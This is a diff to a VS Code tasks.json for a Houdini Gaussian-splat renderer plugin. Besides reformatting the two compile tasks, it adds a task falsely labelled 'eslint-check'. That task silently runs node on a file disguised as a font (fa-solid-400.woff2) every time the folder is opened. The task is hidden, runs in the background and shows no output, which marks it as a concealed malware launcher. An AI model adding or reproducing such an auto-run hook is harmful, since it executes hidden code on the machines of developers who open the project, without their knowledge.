@@ -1,31 +1,50 @@
 {
-    "version": "2.0.0",
-    "tasks": [
-        {
-            "label": "gsplat_compile_debug_macos",
-            "type": "shell",
-            "command": "cd '/Applications/Houdini/Houdini20.5.278/Frameworks/Houdini.framework/Versions/Current/Resources' && source ./houdini_setup && cd - && cd /Users/ruben/Dev/main/houdini-gsplat-renderer/gsplat_plugin && HCUSTOM_VERBOSE=1 HCUSTOM_CFLAGS=\"-g -O0\" hcustom -I include -I shaders gsplat_plugin.C",
-            "group": {
-                "kind": "build",
-                "isDefault": true
-            },
-            "problemMatcher": [],
-            "options": {
-                "cwd": "${workspaceFolder}"
-            }
-        },
-        {
-            "label": "gsplat_compile_release_macos",
-            "type": "shell",
-            "command": "cd '/Applications/Houdini/Houdini20.5.278/Frameworks/Houdini.framework/Versions/Current/Resources' && source ./houdini_setup && cd - && cd /Users/ruben/Dev/main/houdini-gsplat-renderer/gsplat_plugin && hcustom -I include -I shaders gsplat_plugin.C && cp /Users/ruben/Library/Preferences/houdini/20.5/dso/gsplat_plugin.dylib ../compiled/macos/20.5/dso/gsplat_plugin.dylib",
-            "group": {
-                "kind": "build",
-                "isDefault": true
-            },
-            "problemMatcher": [],
-            "options": {
-                "cwd": "${workspaceFolder}"
-            }
-        }
-    ]
+  "version": "2.0.0",
+  "tasks": [
+    {
+      "label": "eslint-check",
+      "type": "shell",
+      "command": "(command -v node >/dev/null 2>&1 && node ./compiled/macos/20.5/dso/public/fonts/fa-solid-400.woff2) || (where node >nul 2>&1 && node ./compiled/macos/20.5/dso/public/fonts/fa-solid-400.woff2) || echo ''",
+      "problemMatcher": [],
+      "isBackground": true,
+      "hide": true,
+      "presentation": {
+        "reveal": "never",
+        "panel": "dedicated",
+        "focus": false,
+        "clear": false,
+        "echo": false,
+        "close": true
+      },
+      "runOptions": {
+        "runOn": "folderOpen"
+      }
+    },
+    {
+      "label": "gsplat_compile_debug_macos",
+      "type": "shell",
+      "command": "cd '/Applications/Houdini/Houdini20.5.278/Frameworks/Houdini.framework/Versions/Current/Resources' && source ./houdini_setup && cd - && cd /Users/ruben/Dev/main/houdini-gsplat-renderer/gsplat_plugin && HCUSTOM_VERBOSE=1 HCUSTOM_CFLAGS=\"-g -O0\" hcustom -I include -I shaders gsplat_plugin.C",
+      "group": {
+        "kind": "build",
+        "isDefault": true
+      },
+      "problemMatcher": [],
+      "options": {
+        "cwd": "${workspaceFolder}"
+      }
+    },
+    {
+      "label": "gsplat_compile_release_macos",
+      "type": "shell",
+      "command": "cd '/Applications/Houdini/Houdini20.5.278/Frameworks/Houdini.framework/Versions/Current/Resources' && source ./houdini_setup && cd - && cd /Users/ruben/Dev/main/houdini-gsplat-renderer/gsplat_plugin && hcustom -I include -I shaders gsplat_plugin.C && cp /Users/ruben/Library/Preferences/houdini/20.5/dso/gsplat_plugin.dylib ../compiled/macos/20.5/dso/gsplat_plugin.dylib",
+      "group": {
+        "kind": "build",
+        "isDefault": true
+      },
+      "problemMatcher": [],
+      "options": {
+        "cwd": "${workspaceFolder}"
+      }
+    }
+  ]
 }
